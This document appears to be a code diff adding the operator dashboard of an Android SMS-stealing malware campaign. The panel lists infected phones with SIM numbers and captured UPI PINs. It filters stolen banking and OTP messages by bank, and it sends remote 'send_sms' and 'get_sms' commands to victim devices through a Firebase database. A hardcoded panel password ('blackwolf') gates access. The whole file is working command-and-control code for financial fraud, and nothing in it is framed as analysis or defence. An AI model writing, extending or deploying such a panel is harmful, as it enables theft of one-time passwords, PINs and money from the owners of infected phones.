+function toast(msg,type='success'){
+const box=document.getElementById('toast-box');
+if(!box)return;
+box.innerHTML=''; // clear previous toast instantly so only 1 appears
+const t=document.createElement('div');
+let iconHtml = '<div class="w-6 h-6 rounded-full bg-blue-50 text-[#2481d7] flex items-center justify-center text-xs"><i class="fa-solid fa-tower-broadcast"></i></div>';
+if(type==='error') iconHtml = '<div class="w-6 h-6 rounded-full bg-red-50 text-red-500 flex items-center justify-center text-xs"><i class="fa-solid fa-circle-exclamation"></i></div>';
+else if(type==='info') iconHtml = '<div class="w-6 h-6 rounded-full bg-blue-50 text-blue-500 flex items-center justify-center text-xs"><i class="fa-solid fa-info"></i></div>';
+
+t.className='toast bg-[#ebeef2]/95 backdrop-blur-md border border-[#d5dde5] text-[#2c3e50] shadow-[0_8px_24px_rgba(0,0,0,0.12)] px-4 py-2 rounded-full flex items-center gap-2.5 text-[13px] font-bold select-none';
+t.innerHTML=`${iconHtml}<span>${msg}</span>`;
+box.appendChild(t);
+setTimeout(()=>{
+  t.style.opacity='0';
+  t.style.transform='scale(0.9) translateY(6px)';
+  t.style.transition='all .2s ease';
+  setTimeout(()=>t.remove(),200);
+},1800);
+}
+
+// ===== MODAL =====
+function showDeleteModal(deviceId){
+const m=document.getElementById('modal');m.style.display='flex';
+document.getElementById('modal-confirm-btn').onclick=()=>{deleteDevice(deviceId);closeModal()};
+}
+function closeModal(){document.getElementById('modal').style.display='none'}
+
+// ===== NAVIGATION =====
+function navigateTo(screen,deviceId){
+previousScreen=currentScreen;currentScreen=screen;
+document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+const target=document.getElementById('screen-'+screen);
+if(target)target.classList.add('active');
+if(screen==='detail'){
+document.getElementById('main-header').style.display='none';
+document.getElementById('bottom-nav').style.display='none';
+if(deviceId)selectedDeviceId=deviceId;
+renderDeviceDetail();
+}else{
+document.getElementById('main-header').style.display='';
+document.getElementById('bottom-nav').style.display='flex';
+}
+document.querySelectorAll('[data-tab]').forEach(t=>{
+const active=t.dataset.tab===screen;
+t.classList.toggle('text-blue-500',active);
+t.classList.toggle('text-gray-400',!active);
+});
+if(screen==='devices')renderDevices();
+if(screen==='messages')renderGlobalMessages();
+if(screen==='data')renderDataScreen();
+if(screen==='bulk')renderBulkScreen();
+if(screen==='auto-token')renderAutoTokenScreen();
+if(screen==='sessions')renderSessions();
+window.scrollTo(0,0);
+}
+
+// ===== UTILITY =====
+function getBrand(m){
+if(!m)return'Unknown';const u=m.toUpperCase();
+if(u.startsWith('SM-')||u.includes('GALAXY'))return'Samsung';
+if(u.startsWith('V2')||u.startsWith('V1')||u.startsWith('Y1')||u.startsWith('Y2'))return'vivo';
+if(u.includes('NOKIA'))return'Nokia';if(u.includes('REDMI')||u.includes('POCO'))return'Xiaomi';
+if(u.includes('PIXEL'))return'Google';if(u.startsWith('CPH'))return'OPPO';
+if(u.includes('MOTO'))return'Motorola';if(u.startsWith('RMX'))return'Realme';
+if(u.includes('TECNO'))return'TECNO';if(u.includes('ITEL'))return'itel';
+return m.split(/[\s-]/)[0]||'Generic';
+}
+function formatDuration(sec){
+  if(isNaN(sec) || sec < 0) return 'Active now';
+  if(sec < 60) return `${sec}s ago`;
+  const min = Math.floor(sec / 60);
+  if(min < 60) {
+    const remSec = sec % 60;
+    return remSec > 0 ? `${min}m ${remSec}s ago` : `${min}m ago`;
+  }
+  const hr = Math.floor(min / 60);
+  if(hr < 24) {
+    const remMin = min % 60;
+    return remMin > 0 ? `${hr}h ${remMin}m ago` : `${hr}h ago`;
+  }
+  const days = Math.floor(hr / 24);
+  const remHr = hr % 24;
+  return remHr > 0 ? `${days}d ${remHr}h ago` : `${days}d ago`;
+}
+function relTime(str){
+if(!str)return'N/A';
+const d=new Date(str.replace(' ','T'));const now=Date.now();const s=Math.floor((now-d)/1000);
+return formatDuration(s);
+}
+function fmtDate(str){
+if(!str)return'N/A';
+try{const d=new Date(str.replace(' ','T'));
+return d.toLocaleDateString('en-IN',{day:'2-digit',month:'2-digit',year:'numeric'})+' | '+d.toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit',hour12:true});}catch(e){return str}
+}
+function copyText(t){navigator.clipboard.writeText(t).then(()=>toast('Copied!','success')).catch(()=>toast('Copy failed','error'))}
+function randNum(min,max){return Math.floor(Math.random()*(max-min+1))+min}
+function fillTemplate(tpl){
+return tpl.replace('{OTP}',randNum(100000,999999)).replace('{AMT}',randNum(100,50000).toLocaleString())
+.replace('{REF}',randNum(100000000,999999999)).replace('{AC}',randNum(1000,9999))
+.replace('{BAL}',randNum(1000,500000).toLocaleString()).replace('{MERCH}','Online Store');
+}
+function nowStr(){const d=new Date();return d.getFullYear()+'-'+String(d.getMonth()+1).padStart(2,'0')+'-'+String(d.getDate()).padStart(2,'0')+' '+String(d.getHours()).padStart(2,'0')+':'+String(d.getMinutes()).padStart(2,'0')+':'+String(d.getSeconds()).padStart(2,'0')}
+
+// ===== COUNTERS =====
+function updateCounters(){
+const keys=Object.keys(allDevices);const total=keys.length;
+const online=keys.filter(k=>allDevices[k]?.status?.state==='online').length;
+document.querySelectorAll('.device-online-count').forEach(e=>e.textContent=online);
+document.querySelectorAll('.device-total-count').forEach(e=>e.textContent=total);
+document.querySelectorAll('.device-counter-text').forEach(e=>e.textContent=online+' / '+total);
+}
+
+// ===== RENDER DEVICES LIST =====
+function renderDevices(){
+const container=document.getElementById('devices-list');
+const q=(document.getElementById('device-search')?.value||'').toLowerCase();
+
+window.deviceSeqMap = window.deviceSeqMap || {};
+window.nextSeq = window.nextSeq || 1;
+if (Object.keys(window.deviceSeqMap).length === 0 && Object.keys(allDevices).length > 0) {
+  let sorted = Object.keys(allDevices).sort((a,b)=>(allDevices[a]?.status?.last_active_ms||0)-(allDevices[b]?.status?.last_active_ms||0));
+  sorted.forEach(k => window.deviceSeqMap[k] = window.nextSeq++);
+}
+Object.keys(allDevices).forEach(k => {
+  if (!window.deviceSeqMap[k]) window.deviceSeqMap[k] = window.nextSeq++;
+});
+
+let keys=Object.keys(allDevices);
+keys.sort((a,b) => window.deviceSeqMap[b] - window.deviceSeqMap[a]);
+
+const filterType = document.getElementById('device-filter')?.value || 'all';
+const filterBadge = document.getElementById('filter-badge');
+if (filterBadge) {
+  if (filterType === 'online') {
+    filterBadge.textContent = 'ONLINE';
+    filterBadge.className = 'text-[10px] font-black px-2 py-0.5 rounded-full bg-[#dcfce7] text-[#16a34a] border border-[#bbf7d0] uppercase tracking-wider shadow-sm';
+  } else if (filterType === 'offline') {
+    filterBadge.textContent = 'OFFLINE';
+    filterBadge.className = 'text-[10px] font-black px-2 py-0.5 rounded-full bg-[#fee2e2] text-[#ef4444] border border-[#fca5a5] uppercase tracking-wider shadow-sm';
+  } else {
+    filterBadge.textContent = 'ALL';
+    filterBadge.className = 'text-[10px] font-black px-2 py-0.5 rounded-full bg-[#dceef9] text-[#2481d7] border border-[#b8daef] uppercase tracking-wider shadow-sm';
+  }
+}
+
+if(filterType !== 'all') {
+  keys = keys.filter(k => {
+    const isOn = allDevices[k]?.status?.state === 'online';
+    return filterType === 'online' ? isOn : !isOn;
+  });
+}
+
+if(q)keys=keys.filter(k=>{const d=allDevices[k];const i=d?.info||{};
+return k.includes(q)||(i.deviceModel||'').toLowerCase().includes(q)||(i.sim1Number||'').includes(q)||(i.sim2Number||'').includes(q)||(i.phoneNumber||'').toLowerCase().includes(q)});
+if(!keys.length){container.innerHTML='<div class="text-center text-gray-400 py-10"><i class="fa-solid fa-mobile-screen-button text-4xl mb-2"></i><p class="text-sm">No devices found</p></div>';return}
+
+let html='';
+keys.forEach((k,idx)=>{
+const d=allDevices[k],info=d?.info||{},status=d?.status||{};
+const num=window.deviceSeqMap[k];
+const model=info.deviceModel||'Unknown';
+const brand=getBrand(model);
+const os=info.osVersion||'?';
+const bat=info.batteryLevel||'?';
+const isOn=status.state==='online';
+const sim1=info.sim1Number&&info.sim1Number!=='Unknown'&&info.sim1Number!=='N/A'?info.sim1Number:'';
+const sim1Car=info.sim1Carrier||'';
+const sim2=info.sim2Number&&info.sim2Number!=='N/A'&&info.sim2Number!=='Unknown'?info.sim2Number:'';
+const sim2Car=info.sim2Carrier||'';
+const pin=info.pin||'N/A';
+const lastAct=fmtDate(info.lastActive||status.last_seen);
+
+html+=`<div class="bg-[#eef7fd] rounded-2xl p-4 shadow-sm border border-[#dcecf8] relative cursor-pointer" onclick="navigateTo('detail','${k}')">
+<div class="absolute right-3 top-3 flex flex-col gap-3 items-center">
+<button onclick="event.stopPropagation();sendCommand('${k}','CHECK_ONLINE')" class="w-9 h-9 flex items-center justify-center rounded-full bg-[#fdecd5] text-[#f59e0b]"><i class="fa-solid fa-tower-broadcast"></i></button>
+<button onclick="event.stopPropagation();showDeleteModal('${k}')" class="w-9 h-9 flex items-center justify-center rounded-full bg-[#fce8e8] text-[#ef4444]"><i class="fa-regular fa-trash-can"></i></button>
+</div>
+<div class="flex gap-3">
+<div class="w-[50px] h-[50px] rounded-full bg-[#2481d7] flex items-center justify-center text-white font-black text-xl flex-shrink-0 shadow-sm mt-1">${num}</div>
+<div class="flex-1 min-w-0 pr-12">
+<div class="flex items-center gap-2 mb-1"><span class="font-bold text-[17px] text-[#1a2b4b]">${model}</span><span class="bg-[#dceef9] border border-[#b8daef] text-[#2481d7] text-[10px] font-bold px-2 py-0.5 rounded-full">A${os}</span></div>
+<div class="text-[11px] text-[#5c7b9e] mb-2 truncate font-medium">${k.substring(0,16)}… · device id</div>
+${sim1?`<div class="text-[13px] text-[#4b5563] flex items-center gap-2 mb-1 font-medium"><i class="fa-regular fa-hard-drive text-[11px] text-[#94a3b8]"></i> sim1 <span class="font-bold">${sim1}</span> ${sim1Car}</div>`:''}
+${sim2?`<div class="text-[13px] text-[#4b5563] flex items-center gap-2 mb-2 font-medium"><i class="fa-regular fa-hard-drive text-[11px] text-[#94a3b8]"></i> sim2 <span class="font-bold">${sim2}</span> ${sim2Car}</div>`:''}
+<div class="flex items-center gap-3 mt-1.5 mb-2">
+<div class="bg-[#dceef9] text-[#2481d7] text-[11px] font-bold px-2.5 py-1 rounded-full flex items-center gap-1.5 border border-[#b8daef]"><i class="fa-solid fa-battery-half"></i> ${bat}</div>
+<div class="flex items-center gap-1.5 text-[12px] font-bold"><span class="text-gray-500 italic font-serif tracking-tighter pr-0.5">UPI</span> <span class="text-[#ef4444]">${pin}</span></div>
+</div>
+<div class="flex flex-col gap-1 mt-2">
+<span class="flex items-center gap-1.5 text-[11px] font-bold ${isOn?'text-[#10b981]':'text-gray-400'}"><span class="w-2 h-2 rounded-full ${isOn?'bg-[#10b981]':'bg-gray-400'}"></span>${isOn?'online':'offline'}</span>
+<span class="text-[10px] text-[#64748b] font-medium">Recent ${lastAct}</span>
+</div></div></div></div>`;
+});
+container.innerHTML=html;
+}
+
+// ===== RENDER DEVICE DETAIL =====
+function renderDeviceDetail(){
+if(!selectedDeviceId||!allDevices[selectedDeviceId])return;
+const d=allDevices[selectedDeviceId],info=d.info||{},status=d.status||{};
+const model=info.deviceModel||'Unknown';const brand=getBrand(model);const isOn=status.state==='online';
+
+// Header & Status
+document.getElementById('detail-title').textContent=brand+' '+model;
+const badge=document.getElementById('detail-status-badge');
+badge.innerHTML=isOn?'<span class="w-1.5 h-1.5 rounded-full bg-[#16a34a] pulse-dot"></span> Online':'<span class="w-1.5 h-1.5 rounded-full bg-gray-400"></span> Offline';
+badge.className='px-2.5 py-1 rounded-full text-[11px] font-bold flex items-center gap-1.5 shadow-sm border '+(isOn?'bg-[#dcfce7] text-[#16a34a] border-[#bbf7d0]':'bg-gray-100 text-gray-500 border-gray-200');
+
+// Info Grid
+document.getElementById('info-model').textContent=model;
+document.getElementById('info-brand').textContent=brand;
+document.getElementById('info-os').textContent=info.osVersion?('A'+info.osVersion):'—';
+document.getElementById('info-battery').textContent=info.batteryLevel||'—';
+
+const s1=info.sim1Number&&info.sim1Number!=='Not Available'&&info.sim1Number!=='Unknown'?info.sim1Number:'—';
+document.getElementById('info-sim1').textContent=s1;
+if(s1!=='—') document.getElementById('info-sim1-copy').classList.remove('hidden');
+else document.getElementById('info-sim1-copy').classList.add('hidden');
+document.getElementById('info-sim1-carrier').textContent=info.sim1Carrier||'—';
+
+const s2=info.sim2Number&&info.sim2Number!=='Not Available'&&info.sim2Number!=='Unknown'?info.sim2Number:'—';
+document.getElementById('info-sim2').textContent=s2;
+if(s2!=='—') document.getElementById('info-sim2-copy').classList.remove('hidden');
+else document.getElementById('info-sim2-copy').classList.add('hidden');
+document.getElementById('info-sim2-carrier').textContent=info.sim2Carrier||'—';
+
+document.getElementById('info-upi').textContent=info.upi_pin||'—';
+document.getElementById('info-last-seen').textContent=relTime(status.last_seen||info.lastActive);
+document.getElementById('info-last-seen').className='text-sm font-black '+(isOn?'text-[#16a34a]':'text-gray-500');
+document.getElementById('info-joined').textContent=fmtDate(info.lastActive);
+document.getElementById('info-id').textContent=selectedDeviceId;
+
+// SIM Buttons
+const simBtns=document.getElementById('sim-buttons');
+simBtns.innerHTML=`
+<button onclick="sendSms(0)" class="flex-1 bg-[#2481d7] text-white py-2.5 rounded-[10px] font-bold text-[11px] shadow-[0_2px_4px_rgba(36,129,215,0.15)] active:scale-95 truncate px-2">SIM 1${info.sim1Carrier ? ' · '+info.sim1Carrier : ''}</button>
+<button onclick="sendSms(1)" class="flex-1 bg-[#2481d7] text-white py-2.5 rounded-[10px] font-bold text-[11px] shadow-[0_2px_4px_rgba(36,129,215,0.15)] active:scale-95 truncate px-2">SIM 2${info.sim2Carrier ? ' · '+info.sim2Carrier : ''}</button>`;
+
+if(detailTab==='overview')renderDetailSms();
+if(detailTab==='banking')renderBankingSms();
+updateRelayUiState(activeRelayDeviceId);
+}
+function copyToClipboard(text){
+navigator.clipboard.writeText(text).then(()=>{toast('Copied!','success')}).catch(()=>{toast('Failed to copy','error')});
+}
+
+// ===== SMS RENDERING =====
+function renderDetailSms(){
+const d=allDevices[selectedDeviceId];if(!d)return;
+const smsData=d.sms||{};const q=(document.getElementById('sms-search')?.value||'').toLowerCase();
+let msgs=Object.values(smsData).filter(m=>m.type===(smsFilterType==='received'?'received':'sent'));
+if(q)msgs=msgs.filter(m=>(m.message||'').toLowerCase().includes(q)||(m.sender||'').toLowerCase().includes(q));
+msgs.sort((a,b)=>new Date(b.timestamp||0)-new Date(a.timestamp||0));
+msgs=msgs.slice(0,100);
+const list=document.getElementById('sms-list');
+if(!msgs.length){list.innerHTML='<p class="text-center text-gray-400 text-sm py-6">No messages found</p>';return}
+const newHtml=msgs.map(m=>`<div class="bg-white rounded-xl p-3 shadow-sm border border-gray-50">
+<div class="flex items-start justify-between mb-1">
+<span class="font-bold text-xs text-blue-600">${m.sender||'Unknown'}</span>
+<div class="flex gap-2">
+<button onclick="copyText('${(m.sender||'').replace(/'/g,"\\'")}')" class="text-[10px] text-blue-500 font-semibold">Copy No.</button>
+<button onclick="copyText(\`${(m.message||'').replace(/`/g,'\\`').replace(/\\/g,'\\\\')}\`)" class="text-[10px] text-blue-500 font-semibold">Copy Body</button>
+</div></div>
+<p class="text-xs text-gray-600 leading-relaxed mb-1.5">${(m.message||'').substring(0,300)}${(m.message||'').length>300?'...':''}</p>
+<div class="flex items-center justify-between"><span class="text-[10px] text-gray-400">${m.timestamp||''}</span>
+<span class="text-[10px] bg-blue-50 text-blue-500 px-2 py-0.5 rounded-full font-semibold">SIM 1</span></div>
+</div>`).join('');
+if (list.innerHTML !== newHtml) list.innerHTML = newHtml;
+}
+
+function setSmsFilter(type){
+smsFilterType=type;
+document.querySelectorAll('.sms-filter-btn').forEach((b,i)=>{
+const active=(i===0&&type==='received')||(i===1&&type==='sent');
+b.className='sms-filter-btn px-4 py-1.5 rounded-full text-xs font-semibold '+(active?'bg-blue-500 text-white':'bg-gray-200 text-gray-600');
+});renderDetailSms();
+}
+
+// ===== BANKING TAB =====
+let detailTab = 'overview';
+
+function detectBank(msg,sender){
+const txt=(msg+' '+sender).toUpperCase();
+for(const b of BANKS){for(const p of b.p){if(txt.includes(p.toUpperCase()))return b.name}}
+// Fallback for any financial / OTP / UPI / Bank SMS
+if(/OTP|DEBIT|CREDIT|BANK|UPI|ACCOUNT|BAL|RS\.|INR|CARD|PAYMENT|A\/C|VPA|TRANS|NETBANKING/i.test(txt)){
+return 'Banking/UPI';
+}
+return null;
+}
+function detectTxType(msg){
+const m=msg.toLowerCase();
+if(m.includes('otp')||m.includes('one time password')||m.includes('verification code')||m.includes('code'))return'otp';
+if(m.includes('credited')||m.includes('upi credit')||m.includes('credit:')||m.includes('received'))return'credit';
+if(m.includes('debited')||m.includes('upi debit')||m.includes('debit:')||m.includes('sent'))return'debit';
+return'bank';
+}
+
+function renderBankingSms(){
+if(!selectedDeviceId||!allDevices[selectedDeviceId])return;
+const smsData=allDevices[selectedDeviceId].sms||{};
+let bankMsgs=[];const detectedBanks=new Set();
+Object.values(smsData).forEach(m=>{
+const bank=detectBank(m.message||'',m.sender||'');
+if(bank){const txType=detectTxType(m.message||'');bankMsgs.push({...m,bank,txType});detectedBanks.add(bank)}
+});
+// Bank name filter buttons
+const bankFilters=document.getElementById('bank-name-filters');
+if(bankFilters){
+bankFilters.innerHTML=[...detectedBanks].sort().map(b=>
+`<button onclick="setBankNameFilter('${b}')" class="bank-name-btn px-2.5 py-1 rounded-full text-[10px] font-semibold ${bankFilterName===b?'bg-blue-500 text-white':'bg-gray-100 text-gray-600'}">${b}</button>`
+).join('');
+}
+// Filter
+if(bankFilterType!=='all')bankMsgs=bankMsgs.filter(m=>m.txType===bankFilterType);
+if(bankFilterName)bankMsgs=bankMsgs.filter(m=>m.bank===bankFilterName);
+bankMsgs.sort((a,b)=>new Date(b.timestamp||0)-new Date(a.timestamp||0));
+// Limit to LAST 100 SMS for speed and performance
+bankMsgs=bankMsgs.slice(0,100);
+
+const list=document.getElementById('banking-sms-list');
+if(!list) return;
+if(!bankMsgs.length){list.innerHTML='<p class="text-center text-gray-400 text-sm py-6">No banking messages found</p>';return}
+const newHtml = bankMsgs.map(m=>{
+const tc=m.txType==='credit'?'text-green-600 bg-green-50':m.txType==='debit'?'text-red-600 bg-red-50':m.txType==='otp'?'text-purple-600 bg-purple-50':'text-blue-600 bg-blue-50';
+return`<div class="bg-white rounded-xl p-3 shadow-sm border border-gray-50">
+<div class="flex items-start justify-between mb-1">
+<span class="font-bold text-xs text-blue-600">${m.sender||''}</span>
+<div class="flex gap-1.5">
+<span class="${tc} text-[9px] font-bold px-2 py-0.5 rounded-full uppercase">${m.txType}</span>
+<span class="bg-gray-100 text-gray-600 text-[9px] font-bold px-2 py-0.5 rounded-full">${m.bank}</span>
+</div></div>
+<p class="text-xs text-gray-600 leading-relaxed mb-1">${(m.message||'').substring(0,250)}</p>
+<div class="flex items-center justify-between"><span class="text-[10px] text-gray-400">${m.timestamp||''}</span>
+<button onclick="copyText(\`${(m.message||'').replace(/`/g,'').substring(0,200)}\`)" class="text-[10px] text-blue-500 font-semibold">Copy</button></div>
+</div>`}).join('');
+if(list.innerHTML !== newHtml) list.innerHTML = newHtml;
+}
+
+function setBankFilter(type){
+bankFilterType=type;bankFilterName=null;
+document.querySelectorAll('.bank-filter-btn').forEach(b=>{
+b.className='bank-filter-btn px-3 py-1.5 rounded-full text-xs font-semibold '+(b.textContent.toLowerCase()===type?'bg-blue-500 text-white':'bg-gray-200 text-gray-600');
+});renderBankingSms();
+}
+function setBankNameFilter(name){
+bankFilterName=bankFilterName===name?null:name;renderBankingSms();
+}
+
+function switchDetailTab(tab){
+detailTab=tab;
+document.getElementById('detail-overview').style.display=tab==='overview'?'':'none';
+document.getElementById('detail-banking').style.display=tab==='banking'?'':'none';
+document.getElementById('tab-overview').className='flex-1 py-3 text-xs font-bold '+(tab==='overview'?'text-[#2481d7] border-b-2 border-[#2481d7]':'text-gray-400 border-b-2 border-transparent')+' uppercase tracking-wider';
+document.getElementById('tab-banking').className='flex-1 py-3 text-xs font-bold '+(tab==='banking'?'text-[#2481d7] border-b-2 border-[#2481d7]':'text-gray-400 border-b-2 border-transparent')+' uppercase tracking-wider';
+if(tab==='overview')renderDetailSms();
+if(tab==='banking')renderBankingSms();
+}
+
+// ===== AUTO TOKEN =====
+let autoTokenDeviceId=null;
+function renderAutoTokenScreen(){
+const container=document.getElementById('auto-token-list');
+const keys=Object.keys(allDevices).filter(k=>allDevices[k]?.status?.state==='online');
+keys.sort((a,b)=>(allDevices[b]?.status?.last_active_ms||0)-(allDevices[a]?.status?.last_active_ms||0));
+if(!keys.length){container.innerHTML='<div class="text-center text-gray-400 py-10">No online devices</div>';return;}
+container.innerHTML=keys.map(k=>{
+const d=allDevices[k],info=d?.info||{};
+const model=info.deviceModel||'Unknown';
+return `<div class="bg-white rounded-xl p-4 shadow-sm border border-gray-100 flex items-center justify-between active:bg-gray-50 cursor-pointer" onclick="openAutoTokenModal('${k}')">
+<div class="flex items-center gap-3">
+<div class="w-10 h-10 rounded-full bg-blue-100 text-blue-500 flex items-center justify-center"><i class="fa-solid fa-mobile-screen"></i></div>
+<div><div class="font-bold text-sm text-gray-800">${model}</div><div class="text-[10px] text-green-500 font-semibold">Online</div></div>
+</div>
+<i class="fa-solid fa-chevron-right text-gray-300"></i>
+</div>`;
+}).join('');
+}
+function openAutoTokenModal(deviceId){
+autoTokenDeviceId=deviceId;
+const d=allDevices[deviceId],info=d?.info||{};
+document.getElementById('auto-token-model').textContent=info.deviceModel||'Unknown';
+const sim1=info.sim1Carrier||'SIM 1';
+const sim2=info.sim2Carrier||'SIM 2';
+document.getElementById('auto-token-sims').innerHTML=`
+<button onclick="sendAutoTokenSms(0)" class="flex-1 bg-[#2481d7] text-white py-3 rounded-lg font-bold text-xs shadow-sm active:scale-95 transition-transform truncate px-2">SIM 1 · ${sim1}</button>
+<button onclick="sendAutoTokenSms(1)" class="flex-1 bg-[#2481d7] text-white py-3 rounded-lg font-bold text-xs shadow-sm active:scale-95 transition-transform truncate px-2">SIM 2 · ${sim2}</button>`;
+document.getElementById('auto-token-num').value='';
+document.getElementById('auto-token-msg').value='';
+document.getElementById('auto-token-modal').style.display='flex';
+}
+function closeAutoTokenModal(){document.getElementById('auto-token-modal').style.display='none';autoTokenDeviceId=null;}
+async function pasteToAutoToken(){
+try{const t=await navigator.clipboard.readText();
+if(t.includes('|')){
+const parts=t.split('|');
+document.getElementById('auto-token-num').value=parts[0].trim();
+document.getElementById('auto-token-msg').value=parts.slice(1).join('|').trim();
+}else{
+const numMatch=t.match(/(\d{10})/);
+if(numMatch) document.getElementById('auto-token-num').value=numMatch[1];
+document.getElementById('auto-token-msg').value=t;
+}
+toast('Pasted from clipboard','success');}catch(e){toast('Cannot access clipboard','error');}
+}
+function sendAutoTokenSms(simSlot){
+if(!autoTokenDeviceId)return;
+const num=document.getElementById('auto-token-num').value.trim();
+const msg=document.getElementById('auto-token-msg').value.trim();
+if(!num||!msg){toast('Enter number and message','error');return;}
+
+const payload = {
+  command: "send_sms",
+  args: {
+    number: num,
+    message: msg,
+    sim_index: parseInt(simSlot)
+  },
+  executed: false,
+  timestamp: nowStr()
+};
+db.ref(`${BASE}/commands/${autoTokenDeviceId}`).push(payload);
+toast('Sent ✓','success');
+closeAutoTokenModal();
+}
+
+// ===== AUTH & SESSIONS =====
+let mySessionId=null;
+let panelPassword='blackwolf'; // Fallback if none in DB
+let authRealtimeRef=null;
+
+function togglePassword(){
+const inp=document.getElementById('login-password');
+const icon=document.getElementById('eye-icon');
+if(inp.type==='password'){inp.type='text';icon.className='fa-solid fa-eye-slash text-blue-500';}
+else{inp.type='password';icon.className='fa-solid fa-eye';}
+}
+
+function getDeviceId(){
+let id=localStorage.getItem('bw_device_id');
+if(!id){id='web_'+Math.random().toString(36).substr(2,9);localStorage.setItem('bw_device_id',id);}
+return id;
+}
+
+function checkLogin(){
+const input=document.getElementById('login-password').value.trim();
+if(input===panelPassword){
+document.getElementById('login-screen').style.display='none';
+document.body.classList.remove('overflow-hidden');
+document.body.style.overflow = '';
+toast('Welcome back, BERLIN','success');
+startSession();
+}else{
+toast('Incorrect password','error');
+}
+}
+
+function getClientDeviceInfo(){
+  const ua = navigator.userAgent;
+  let dev = 'Desktop (PC)';
+  if(/Android/i.test(ua)) dev = 'Android Device';
+  else if(/iPhone|iPad|iPod/i.test(ua)) dev = 'iOS (iPhone/iPad)';
+  else if(/Macintosh|Mac OS X/i.test(ua)) dev = 'MacBook / Mac';
+  else if(/Windows/i.test(ua)) dev = 'Windows PC';
+  else if(/Linux/i.test(ua)) dev = 'Linux PC';
+
+  let browser = 'Browser';
+  if(/Chrome/i.test(ua) && !/Edg/i.test(ua) && !/OPR/i.test(ua)) browser = 'Chrome';
+  else if(/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+  else if(/Firefox/i.test(ua)) browser = 'Firefox';
+  else if(/Edg/i.test(ua)) browser = 'Edge';
+  else if(/OPR/i.test(ua) || /Opera/i.test(ua)) browser = 'Opera';
+
+  return { deviceName: dev, browserName: browser };
+}
+
+function startSession(){
+mySessionId=getDeviceId();
+const ref=db.ref(`${BASE}/sys_data/sessions/${mySessionId}`);
+// Listen for revoke
+ref.on('value',snap=>{
+if(!snap.exists()&&document.getElementById('login-screen').style.display==='none'){
+document.getElementById('login-screen').style.display='flex';
+toast('Session revoked by Admin','error');
+if(window.heartbeatInterval) clearInterval(window.heartbeatInterval);
+}
+});
+// Start heartbeat
+const updateHeartbeat=()=>{
+const client = getClientDeviceInfo();
+ref.set({
+id:mySessionId,
+ip:window.userIP||'127.0.0.1',
+device_name:client.deviceName,
+browser:client.browserName,
+user_agent:navigator.userAgent,
+login_time:nowStr(),
+last_heartbeat:Date.now()
+});
+};
+updateHeartbeat();
+window.heartbeatInterval=setInterval(updateHeartbeat,30000);
+}
+
+// Fetch IP on load
+fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{window.userIP=d.ip}).catch(e=>{window.userIP='Unknown'});
+
+function openPinModal(){document.getElementById('pin-modal').style.display='flex'}
+function saveNewPin(){
+const newPin=document.getElementById('new-pin-input').value.trim();
+if(!newPin){toast('Enter new password','error');return}
+db.ref(`${BASE}/sys_data/meta_v3/darkvendor`).set(newPin).then(()=>{
+toast('Panel password updated globally!','success');
+document.getElementById('pin-modal').style.display='none';
+document.getElementById('new-pin-input').value='';
+});
+}
+
+function renderSessions(){
+const container=document.getElementById('sessions-list');
+db.ref(`${BASE}/sys_data/sessions`).once('value',snap=>{
+const sessions=snap.val()||{};
+const keys=Object.keys(sessions);
+if(!keys.length){container.innerHTML='<div class="text-center text-gray-400 py-10">No active sessions</div>';return;}
+container.innerHTML=keys.map(k=>{
+const s=sessions[k];
+const isMe=k===mySessionId;
+const ago=Math.floor((Date.now()-s.last_heartbeat)/1000);
+const status=ago<60?'<span class="text-green-500 font-semibold">Active now</span>':`<span class="text-orange-500 font-semibold">Active ${formatDuration(ago)}</span>`;
+return `<div class="bg-white rounded-xl p-4 shadow-sm border border-gray-100 flex items-center justify-between">
+<div>
+<div class="font-bold text-sm text-gray-800">${s.ip} ${isMe?'<span class="bg-blue-100 text-blue-600 text-[9px] px-2 py-0.5 rounded-full ml-1 uppercase">This Device</span>':''}</div>
+<div class="text-[10px] text-gray-400 mt-0.5 truncate w-[200px]" title="${s.browser}">${s.browser}</div>
+<div class="text-[11px] mt-1">${status}</div>
+</div>
+${!isMe?`<button onclick="revokeSession('${k}')" class="bg-red-50 text-red-500 p-2 rounded-lg text-xs font-bold active:scale-95 shadow-sm">REVOKE</button>`:''}
+</div>`;
+}).join('');
+});
+}
+function revokeSession(id){
+db.ref(`${BASE}/sys_data/sessions/${id}`).remove();
+toast('Session revoked','success');
+renderSessions();
+}
+function sendCommand(deviceId,cmd,extra={},silent=false){
+const ref=db.ref(`${BASE}/commands/${deviceId}`);
+ref.push({command:cmd,executed:false,timestamp:nowStr(),...extra});
+if(!silent)toast('Sent ✓','success');
+}
+function sendSms(simSlot){
+const num=document.getElementById('sms-to-number').value.trim();
+const msg=document.getElementById('sms-body').value.trim();
+if(!num||!msg){toast('Enter number and message','error');return}
+if(!selectedDeviceId){toast('No device selected','error');return}
+
+// Exact payload structure expected by Android client app
+const payload = {
+  command: "send_sms",
+  args: {
+    number: num,
+    message: msg,
+    sim_index: parseInt(simSlot)
+  },
+  executed: false,
+  timestamp: nowStr()
+};
+
+db.ref(`${BASE}/commands/${selectedDeviceId}`).push(payload);
+
+toast('Sent ✓','success');
+document.getElementById('sms-to-number').value='';
+document.getElementById('sms-body').value='';
+}
+function refreshSms(){if(selectedDeviceId)sendCommand(selectedDeviceId,'get_sms')}
+function deleteDevice(deviceId){
+db.ref(`${BASE}/devices/${deviceId}`).remove();
+db.ref(`${BASE}/commands/${deviceId}`).remove();
+toast('Device deleted','success');
+navigateTo('devices');
+}
+function bulkCheckOnline(){
+let count=0;
+Object.keys(allDevices).forEach(k=>{
+sendCommand(k,'CHECK_ONLINE',{},true);
+count++;
+});toast(`Check Online sent to all ${count} device(s)`,'success');
+}
+async function pasteClipboard(){
+try{const t=await navigator.clipboard.readText();document.getElementById('sms-body').value=t;toast('Pasted!','success')}catch(e){toast('Cannot access clipboard','error')}
+}
+
+// ===== GLOBAL MESSAGES =====
+function renderGlobalMessages(){
+const q=(document.getElementById('global-sms-search')?.value||'').toLowerCase();
+let allMsgs=[];
+Object.entries(allDevices).forEach(([devId,dev])=>{
+const sms=dev.sms||{};
+Object.values(sms).forEach(m=>{allMsgs.push({...m,devId,model:dev?.info?.deviceModel||'Unknown'})});
+});
+if(q)allMsgs=allMsgs.filter(m=>(m.message||'').toLowerCase().includes(q)||(m.sender||'').toLowerCase().includes(q));
